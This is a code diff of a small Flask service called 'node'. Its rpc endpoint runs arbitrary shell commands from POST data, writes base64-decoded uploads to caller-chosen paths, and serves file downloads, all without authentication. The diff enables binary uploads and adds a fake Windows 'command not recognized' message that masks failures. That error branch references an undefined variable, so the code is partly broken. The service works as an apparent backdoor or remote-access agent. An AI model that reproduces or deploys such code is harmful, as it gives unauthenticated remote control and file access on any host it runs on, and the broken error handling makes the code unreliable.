@@ -1,7 +1,7 @@
 # -*- coding=utf-8 -*-
 from flask import Flask, request, Response
 import json
-import os
+import subprocess
 import base64
 
 node = Flask(__name__)
@@ -19,26 +19,26 @@ def rpc(rpc_func):
     if rpc_func == 'cmd':
         try:
             client_function = client_post_data.get('cmd')
-            return_cmd = os.popen(client_function).read()
+            return_cmd = subprocess.check_output(client_function).decode()
+            #return_cmd = os.popen(client_function).read()
             return {'exec_cmd': return_cmd}
 
-        except Exception as e:
-            print(e)
-        pass
+        except:
+            return_cmd = "'" + cmd + "'" + 'is not recognized as an internal or external command,operable program or batch file.'
+            return {'exec_cmd': return_cmd}
 
     elif rpc_func == 'upload':
         try:
             filename = client_post_data.get('filename')
-            # client_file = client_post_data.get('upload')
-            # f1 = base64.b64decode(client_file.encode())
-            # f2 = f1.decode()
-            # with open(upload_file_dir + filename, 'w') as f3:
-            #     f3.write(f2)
+            client_file = client_post_data.get('upload')
+            f1 = client_file.encode()
+            f2 = base64.b64decode(f1)
+            with open(upload_file_dir + filename, 'wb') as f3:
+                 f3.write(f2)
             return {'message': 'Upload Success!', 'upload_file': filename}
 
         except Exception as e:
             print(e)
-            pass
 
     elif rpc_func == 'download':
         try:
@@ -52,7 +52,6 @@ def rpc(rpc_func):
                 return {'result': filename + '下载成功', 'down_file': f3}
         except Exception as e:
             print(e)
-            pass
     else:
         return {'exec_cmd': 'no cmd in json'}
 
